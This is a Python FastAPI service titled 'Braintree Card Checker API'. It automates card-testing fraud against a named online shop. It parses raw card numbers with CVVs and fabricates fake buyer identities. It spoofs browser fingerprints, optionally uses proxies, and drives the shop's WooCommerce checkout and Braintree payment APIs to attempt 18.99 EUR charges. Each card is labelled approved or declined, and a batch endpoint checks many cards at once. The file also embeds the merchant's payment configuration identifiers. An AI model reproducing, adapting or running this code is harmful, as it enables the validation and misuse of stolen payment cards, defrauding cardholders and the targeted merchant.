from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import asyncio
import base64
import datetime
import json
import re
import uuid
import curl_cffi.requests
from bs4 import BeautifulSoup, Tag
from fake_useragent import FakeUserAgent
from faker import Faker
from typing import Optional, List

app = FastAPI(title="Braintree Card Checker API", version="1.0.0")

PROXY = None  # Configure your proxy here

class CardRequest(BaseModel):
    card: str

class CardBatchRequest(BaseModel):
    cards: List[str]

class CardResponse(BaseModel):
    card: str
    status: str
    message: str
    tds_status: Optional[str] = None
    enrolled: Optional[str] = None
    error: Optional[str] = None

def parse_card(card: str):
    try:
        card_number, exp_month, exp_year, cvv = re.findall(r"\d+", card)[:4]
        return card_number, exp_month, exp_year, cvv
    except IndexError:
        raise ValueError(
            "Card format is incorrect. Expected format: card_number, exp_month, exp_year, cvv"
        )

async def get_ip_address() -> str:
    async with curl_cffi.requests.AsyncSession(impersonate="chrome") as session:
        try:
            resp = await session.get(
                "https://api.ipify.org?format=json",
                headers={
                    "accept": "application/json",
                    "user-agent": FakeUserAgent(os=["Windows"]).chrome,
                },
            )
            if resp.ok:
                return resp.json().get("ip", "")
            else:
                print(f"[ERROR] Failed to get IP address: {resp.status_code}")
                return ""
        except Exception as e:
            print(f"[ERROR] Failed to get IP address: {e}")
            return ""

async def braintree_18_99_eur(card: str):
    try:
        card_number, exp_month, exp_year, cvv = parse_card(card)
    except ValueError as e:
        return "error", str(e), None, None

    user_agent = FakeUserAgent(os=["Windows"]).chrome
    fake_us = Faker(locale="en_US")
    first_name = fake_us.first_name()
    last_name = fake_us.last_name()
    street_address = fake_us.street_address()
    city = fake_us.city()
    zip_code = fake_us.zipcode()
    phone = fake_us.numerify("$0%%#$####")
    email = fake_us.email()

    fake_es = Faker(locale="es_ES")
    first_name_es = fake_es.first_name()
    last_name_es = fake_es.last_name()
    street_address_es = fake_es.street_address()
    city_es = "Barcelona"
    zip_code_es = fake_es.numerify("11###")

    req_num = 0
    session_id = str(uuid.uuid4())
    reference_id = str(uuid.uuid4())
    start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ip_address = await get_ip_address()
    if not ip_address:
        return "error", "Could not retrieve IP address", None, None

    session_kwargs = {"impersonate": "chrome"}
    
    if PROXY:
        proxy_parts = PROXY.split(":")
        if len(proxy_parts) == 4:
            proxy, port, username, password = proxy_parts
            session_kwargs["proxies"] = {
                "http": f"socks5h://{username}:{password}@{proxy}:{port}",
                "https": f"socks5h://{username}:{password}@{proxy}:{port}",
            }

    async with curl_cffi.requests.AsyncSession(**session_kwargs) as session:
        try:
            # REQ 1: POST to admin-ajax.php
            req_num = 1
            resp = await session.post(
                "https://nammanmuay.eu/wp-admin/admin-ajax.php",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "quantity": "1",
                    "add-to-cart": "623",
                    "action": "ouwoo_ajax_add_to_cart",
                    "variation_id": "0",
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            # REQ 2: GET to checkout
            req_num = 2
            resp = await session.get(
                "https://nammanmuay.eu/checkout/",
                headers={
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "priority": "u=0, i",
                    "referer": "https://nammanmuay.eu/namman-muay-cream-100g/",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            soup = BeautifulSoup(resp.text, "html.parser")
            script_tag = soup.find("script", string=re.compile(r"wc_braintree_client_token"))
            
            if not script_tag:
                return "error", "Script with 'wc_braintree_client_token' not found", None, None

            script_content = script_tag.get_text()
            match = re.search(r"wc_braintree_client_token\s*=\s*\"(.*?)\";", script_content, re.DOTALL)
            
            if not match:
                return "error", "Variable 'wc_braintree_client_token' not found", None, None

            client_token = match.group(1).strip()
            decoded_token = json.loads(base64.b64decode(client_token).decode("utf-8"))
            authorization_fingerprint = decoded_token.get("authorizationFingerprint")

            input_tag = soup.find("input", id="woocommerce-process-checkout-nonce")
            if input_tag and isinstance(input_tag, Tag):
                checkout_nonce = input_tag.get("value")
            else:
                return "error", "Checkout nonce not found", None, None

            # REQ 3: POST to graphql to get cardinalAuthenticationJWT
            req_num = 3
            resp = await session.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Bearer {authorization_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://assets.braintreegateway.com/",
                    "user-agent": user_agent,
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id,
                    },
                    "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            resp_json = resp.json()
            cardinal_jwt = (
                resp_json.get("data", {})
                .get("clientConfiguration", {})
                .get("creditCard", {})
                .get("threeDSecure", {})
                .get("cardinalAuthenticationJWT")
            )

            # REQ 4: POST to graphql to get tokenized credit card
            req_num = 4
            resp = await session.post(
                "https://payments.braintree-api.com/graphql",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "authorization": f"Bearer {authorization_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://assets.braintreegateway.com/",
                    "user-agent": user_agent,
                },
                json={
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                        "sessionId": session_id,
                    },
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_number,
                                "expirationMonth": exp_month.zfill(2),
                                "expirationYear": (
                                    "20" + exp_year if len(exp_year) == 2 else exp_year
                                ),
                                "cvv": cvv,
                                "billingAddress": {
                                    "postalCode": zip_code,
                                    "streetAddress": street_address,
                                },
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            resp_json = resp.json()
            token = resp_json.get("data", {}).get("tokenizeCreditCard", {}).get("token")

            if not token:
                return "error", "Failed to get token", None, None

            # REQ 5: POST to lookup
            req_num = 5
            resp = await session.post(
                f"https://api.braintreegateway.com/merchants/vb72b9cm2v6gskzz/client_api/v1/payment_methods/{token}/three_d_secure/lookup",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/json",
                    "dnt": "1",
                    "origin": "https://nammanmuay.eu",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://nammanmuay.eu/",
                    "user-agent": user_agent,
                },
                json={
                    "amount": "18.99",
                    "browserColorDepth": 24,
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-US",
                    "browserScreenHeight": 1080,
                    "browserScreenWidth": 1920,
                    "browserTimeZone": 240,
                    "deviceChannel": "Browser",
                    "additionalInfo": {
                        "shippingGivenName": first_name,
                        "shippingSurname": last_name,
                        "ipAddress": ip_address,
                        "billingLine1": street_address,
                        "billingLine2": street_address,
                        "billingCity": city,
                        "billingState": "",
                        "billingPostalCode": zip_code,
                        "billingCountryCode": "US",
                        "billingPhoneNumber": phone,
                        "billingGivenName": first_name_es,
                        "billingSurname": last_name_es,
                        "shippingLine1": street_address_es,
                        "shippingLine2": street_address_es,
                        "shippingCity": city_es,
                        "shippingState": "",
                        "shippingPostalCode": zip_code_es,
                        "shippingCountryCode": "ES",
                        "email": email,
                    },
                    "bin": card_number[:6],
                    "dfReferenceId": f"0_{reference_id}",
                    "clientMetadata": {
                        "requestedThreeDSecureVersion": "2",
                        "sdkVersion": "web/3.123.1",
                        "cardinalDeviceDataCollectionTimeElapsed": 1,
                        "issuerDeviceDataCollectionTimeElapsed": 569,
                        "issuerDeviceDataCollectionResult": True,
                    },
                    "authorizationFingerprint": authorization_fingerprint,
                    "braintreeLibraryVersion": "braintree/web/3.123.1",
                    "_meta": {
                        "merchantAppId": "nammanmuay.eu",
                        "platform": "web",
                        "sdkVersion": "3.123.1",
                        "source": "client",
                        "integration": "custom",
                        "integrationType": "custom",
                        "sessionId": session_id,
                    },
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            resp_json = resp.json()
            nonce = resp_json.get("paymentMethod", {}).get("nonce")
            status = (
                resp_json.get("paymentMethod", {})
                .get("threeDSecureInfo", {})
                .get("status")
            )
            enrolled = (
                resp_json.get("paymentMethod", {})
                .get("threeDSecureInfo", {})
                .get("enrolled")
            )

            # REQ 6: POST to get cart id
            req_num = 6
            resp = await session.post(
                "https://nammanmuay.eu/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "dnt": "1",
                    "origin": "https://nammanmuay.eu",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://nammanmuay.eu/checkout/",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                data={
                    "email": email,
                    "action": "bwfan_insert_abandoned_cart",
                    "checkout_fields_data[shipping_same_as_billing]": "1",
                    "checkout_fields_data[shipping_postcode]": zip_code_es,
                    "checkout_fields_data[shipping_state]": "",
                    "checkout_fields_data[shipping_city]": city_es,
                    "checkout_fields_data[shipping_address_2]": street_address_es,
                    "checkout_fields_data[shipping_address_1]": street_address_es,
                    "checkout_fields_data[shipping_country]": "US",
                    "checkout_fields_data[shipping_last_name]": last_name_es,
                    "checkout_fields_data[shipping_first_name]": first_name_es,
                    "checkout_fields_data[billing_postcode]": zip_code,
                    "checkout_fields_data[billing_state]": "",
                    "checkout_fields_data[billing_city]": city,
                    "checkout_fields_data[billing_address_2]": street_address,
                    "checkout_fields_data[billing_address_1]": street_address,
                    "checkout_fields_data[billing_country]": "US",
                    "checkout_fields_data[billing_phone]": phone,
                    "checkout_fields_data[billing_last_name]": last_name,
                    "checkout_fields_data[billing_first_name]": first_name,
                    "checkout_fields_data[ws_opt_in]": "1",
                    "last_edit_field": "billing_country",
                    "current_step": "single_step",
                    "current_page_id": "54599",
                    "timezone": "America/New_York",
                    "aerocheckout_page_id": "54599",
                    "pushengage_token": "",
                    "_wpnonce": "a8f2caf831",
                },
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            cart_id = resp.json().get("id")

            # REQ 7: POST to checkout (final request)
            req_num = 7
            checkout_data = [
                ("_wfacp_post_id", "54599"),
                ("wfacp_cart_hash", ""),
                ("wfacp_has_active_multi_checkout", ""),
                ("wfacp_source", "https://nammanmuay.eu/checkouts/checkout/"),
                ("product_switcher_need_refresh", "1"),
                ("wfacp_cart_contains_subscription", "0"),
                (
                    "wfacp_exchange_keys",
                    '{"pre_built":{},"oxy":{"wfacp_form":"wfacp_oxy_checkout_form","order_summary":"wfacp_order_summary_widget"}}',
                ),
                ("wfacp_input_hidden_data", "{}"),
                (
                    "wfacp_input_phone_field",
                    f'{{"billing":{{"code":"1","number":"{phone}","hidden":"no"}},"shipping":{{"code":"","number":"","hidden":""}}',
                ),
                ("wfacp_timezone", "America/New_York"),
                ("wc_order_attribution_source_type", "typein"),
                (
                    "wc_order_attribution_referrer",
                    "https://nammanmuay.eu/namman-muay-cream-100g/",
                ),
                ("wc_order_attribution_utm_campaign", "(none)"),
                ("wc_order_attribution_utm_source", "(direct)"),
                ("wc_order_attribution_utm_medium", "(none)"),
                ("wc_order_attribution_utm_content", "(none)"),
                ("wc_order_attribution_utm_id", "(none)"),
                ("wc_order_attribution_utm_term", "(none)"),
                ("wc_order_attribution_utm_source_platform", ""),
                ("wc_order_attribution_utm_creative_format", ""),
                ("wc_order_attribution_utm_marketing_tactic", ""),
                (
                    "wc_order_attribution_session_entry",
                    "https://nammanmuay.eu/checkout/",
                ),
                ("wc_order_attribution_session_start_time", start_time),
                ("wc_order_attribution_session_pages", "2"),
                ("wc_order_attribution_session_count", "1"),
                (
                    "wc_order_attribution_user_agent",
                    user_agent,
                ),
                ("wfacp_billing_address_present", "yes"),
                ("wfob_input_hidden_data", "{}"),
                ("wfob_input_bump_shown_ids", "54600"),
                ("wfob_input_bump_global_data", ""),
                ("billing_email", email),
                ("bwfan_cart_id", cart_id),
                ("billing_first_name", first_name),
                ("billing_last_name", last_name),
                ("billing_address_1", street_address),
                ("billing_address_2", street_address),
                ("billing_country", "US"),
                ("billing_city", city),
                ("billing_postcode", zip_code),
                ("billing_phone", phone),
                ("shipping_same_as_billing", "1"),
                ("shipping_first_name", first_name_es),
                ("shipping_last_name", last_name_es),
                ("shipping_address_1", street_address_es),
                ("shipping_address_2", street_address_es),
                ("shipping_country", "ES"),
                ("shipping_city", city_es),
                ("shipping_postcode", zip_code_es),
                ("wfacp_coupon_field", ""),
                ("shipping_method[0]", "flat_rate:53"),
                ("payment_method", "braintree_cc"),
                ("braintree_cc_nonce_key", nonce),
                (
                    "braintree_cc_device_data",
                    f'{{"correlation_id":{session_id}}}',
                ),
                ("braintree_cc_3ds_nonce_key", ""),
                (
                    "braintree_cc_config_data",
                    f'{{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/vb72b9cm2v6gskzz/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{{"url":"https://client-analytics.braintreegateway.com/vb72b9cm2v6gskzz"}},"merchantId":"vb72b9cm2v6gskzz","venmo":"off","graphQL":{{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]}},"challenges":["cvv"],"creditCards":{{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]}},"threeDSecureEnabled":true,"threeDSecure":{{"cardinalAuthenticationJWT":"{cardinal_jwt}","cardinalSongbirdUrl":"https://songbird.cardinalcommerce.com/edge/v1/songbird.js","cardinalSongbirdIdentityHash":null}},"paypalEnabled":true,"paypal":{{"displayName":"Namman Muay","clientId":"AbRpNknbcK9FznJo2iQkRxSKrgXTdwyu1DiNyS7Pr8brByT5uCOVLQG1EKVFlP2JVDEX49yLnyWQaD1l","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"peterpupovacgmailcom","payeeEmail":null,"currencyIsoCode":"EUR"}}',
                ),
                ("terms", "on"),
                ("terms-field", "1"),
                ("bwfan_user_consent", "1"),
                ("woocommerce-process-checkout-nonce", checkout_nonce),
                (
                    "_wp_http_referer",
                    "/?wc-ajax=update_order_review&wfacp_id=54599&wfacp_is_checkout_override=yes",
                ),
                ("wc_order_attribution_source_type", "typein"),
                (
                    "wc_order_attribution_referrer",
                    "https://nammanmuay.eu/namman-muay-cream-100g/",
                ),
                ("wc_order_attribution_utm_campaign", "(none)"),
                ("wc_order_attribution_utm_source", "(direct)"),
                ("wc_order_attribution_utm_medium", "(none)"),
                ("wc_order_attribution_utm_content", "(none)"),
                ("wc_order_attribution_utm_id", "(none)"),
                ("wc_order_attribution_utm_term", "(none)"),
                ("wc_order_attribution_utm_source_platform", ""),
                ("wc_order_attribution_utm_creative_format", ""),
                ("wc_order_attribution_utm_marketing_tactic", ""),
                (
                    "wc_order_attribution_session_entry",
                    "https://nammanmuay.eu/checkout/",
                ),
                ("wc_order_attribution_session_start_time", start_time),
                ("wc_order_attribution_session_pages", "2"),
                ("wc_order_attribution_session_count", "1"),
                (
                    "wc_order_attribution_user_agent",
                    user_agent,
                ),
                ("billing_state", ""),
                ("shipping_state", ""),
                ("ship_to_different_address", "1"),
            ]

            resp = await session.post(
                "https://nammanmuay.eu/?wc-ajax=checkout&wfacp_id=54599&wfacp_is_checkout_override=yes",
                headers={
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": "https://nammanmuay.eu",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://nammanmuay.eu/checkout/",
                    "user-agent": user_agent,
                    "x-requested-with": "XMLHttpRequest",
                },
                data=checkout_data,
            )

            if not resp.ok:
                return "error", f"Request {req_num} failed with status code: {resp.status_code}", None, None

            resp_json = resp.json()
            
            if resp_json.get("result") == "success":
                return "approved", "Charged 18,99€", status, enrolled

            message = resp_json.get("messages", "")
            soup = BeautifulSoup(message, "html.parser")
            text = soup.get_text()
            match = re.search(r"Reason:\s*(.*)", text)
            error_reason = match.group(1) if match else "Unknown error"

            return "declined", error_reason, status, enrolled

        except Exception as e:
            return "error", f"Request {req_num} failed: {str(e)}", None, None

@app.get("/")
async def root():
    return {"message": "Braintree Card Checker API", "version": "1.0.0"}

@app.post("/check-card", response_model=CardResponse)
async def check_card(request: CardRequest):
    """
    Check a single credit card
    """
    try:
        result = await braintree_18_99_eur(request.card)
        
        if result is None or len(result) != 4:
            raise HTTPException(status_code=500, detail="Invalid result from card checker")
        
        status, message, tds_status, enrolled = result
        
        return CardResponse(
            card=request.card,
            status=status,
            message=message,
            tds_status=tds_status,
            enrolled=enrolled
        )
    
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")

@app.post("/check-cards", response_model=List[CardResponse])
async def check_cards(request: CardBatchRequest):
    """
    Check multiple credit cards in batch
    """
    results = []
    
    for card in request.cards:
        try:
            result = await braintree_18_99_eur(card)
            
            if result is None or len(result) != 4:
                results.append(CardResponse(
                    card=card,
                    status="error",
                    message="Invalid result from card checker",
                    error="Processing error"
                ))
                continue
            
            status, message, tds_status, enrolled = result
            
            results.append(CardResponse(
                card=card,
                status=status,
                message=message,
                tds_status=tds_status,
                enrolled=enrolled
            ))
            
        except ValueError as e:
            results.append(CardResponse(
                card=card,
                status="error",
                message=str(e),
                error="Card format error"
            ))
        except Exception as e:
            results.append(CardResponse(
                card=card,
                status="error",
                message=f"Processing error: {str(e)}",
                error="Internal error"
            ))
    
    return results

@app.get("/health")
async def health_check():
    """
    Health check endpoint
    """
    return {"status": "healthy", "timestamp": datetime.datetime.now().isoformat()}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
